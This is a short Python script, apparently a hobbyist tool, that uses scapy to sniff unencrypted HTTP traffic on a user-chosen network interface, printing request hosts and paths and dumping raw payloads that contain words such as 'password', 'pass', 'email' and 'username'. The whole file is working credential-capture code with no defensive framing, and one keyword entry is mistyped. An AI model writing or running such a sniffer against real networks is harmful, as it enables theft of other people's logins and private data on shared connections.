import scapy.all as scapy
from scapy.layers import http
import os
from datetime import datetime

print("simple http packet sniffer")
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=package_processing)

def package_processing(packet):
    if packet.haslayer(http.HTTPRequest):
            print("Ip adress --> " + packet[scapy.IP].src)
            print(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keys = ["username.encode()", "password", "pass", "email", "name", "nickname", "text"]
        for key in keys:
            if key.encode() in load:
                print(load)
                break

print('simple http packet sniffer')
os.system("iwconfig")
iface_to_sniff = input("what interface use to sniff?> ")
print("-" * 50)  
print("Sniffing started at:" + str(datetime.now())) 
print("-" * 50)
sniff(iface_to_sniff)